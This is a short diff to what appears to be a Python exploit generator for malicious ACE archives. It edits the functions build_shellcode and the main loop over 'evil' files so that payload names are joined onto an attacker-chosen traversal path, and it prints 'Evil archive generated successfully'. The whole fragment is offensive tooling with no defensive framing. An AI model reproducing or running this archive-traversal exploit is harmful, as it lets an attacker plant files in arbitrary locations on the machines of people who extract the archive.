@@ -51,7 +51,7 @@ def hex2raw(hex_value, N):
     
 def build_shellcode(filename, path=''):
     if path == '':
-        path = filename
+        path = os.path.basename(filename)
     hdr_crc = '6789'
     hdr_size = hex(len(path)+31)[2:]
     hdr_size = hex2raw(hdr_size, 4)
@@ -100,7 +100,7 @@ if __name__ == '__main__':
             build_file(i, '', args.filename)
         
     for i in args.evil:
-        path = args.path + i
+        path = args.path + os.path.basename(i)
         build_file(i, path, args.filename)
     
     with acefile.open(args.filename) as f:
@@ -114,6 +114,3 @@ if __name__ == '__main__':
                 
     print(Color.YELLOW + '[+] Evil archive generated successfully: ' + args.filename)
     print('[+] Evil path: %s\n' % args.path + Color.END)
-
-    
-    
